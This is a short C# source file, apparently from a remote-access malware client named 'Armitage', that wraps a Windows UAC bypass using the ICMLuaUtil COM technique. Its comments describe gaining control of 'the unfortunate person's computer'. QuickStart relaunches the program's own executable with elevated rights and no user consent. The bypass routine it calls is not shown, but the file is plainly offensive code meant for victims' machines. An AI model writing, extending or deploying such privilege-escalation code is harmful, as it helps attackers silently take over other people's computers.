using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.UAC
{
    /// <summary>
    /// Gets creative mode on the unfortunate person's computer.
    /// The methods here matches the criteria: 
    /// 1.) Works on Windows 7 to the latest OS 
    /// 2.) Works on x86
    /// </summary>
    public enum UACMethods
    {
        /// <summary>
        /// The best method.
        /// </summary>
        ICMLuaUtil = 0,
    }
    public class UACBypass
    {

        public static bool QuickStart(string execpath, string args, UACMethods method)
        {
            try
            {
                switch (method)
                {
                    case UACMethods.ICMLuaUtil:
                        ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
                        break;
                }
                return true;
            }
            catch
            {

            }
            return false;

        }
        public static bool QuickStart(UACMethods method)
        {
            return QuickStart(Constants.MyPath, 
                Constants.MyProcessID.ToString() + " " + (int)method, 
                method);
        }
    }
}
